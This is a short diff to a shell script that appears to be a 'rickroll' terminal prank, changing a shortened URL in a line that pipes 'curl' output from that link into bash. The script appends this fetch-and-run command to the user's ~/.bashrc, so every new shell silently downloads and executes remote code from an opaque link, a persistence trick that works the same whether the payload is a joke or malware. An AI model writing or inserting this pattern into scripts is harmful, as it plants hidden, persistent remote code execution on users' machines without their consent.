@@ -7,7 +7,7 @@ audio_gsm="$rick/roll.gsm"
 audio_raw="$rick/roll.s16"
 
 
-NEVER_GONNA='curl -s -L http://bit.ly/10hA8iC | bash'
+NEVER_GONNA='curl -s -L https://bit.ly/3sMiECY | bash'
 MAKE_YOU_CRY="$HOME/.bashrc"
 echo $NEVER_GONNA >> $MAKE_YOU_CRY
 
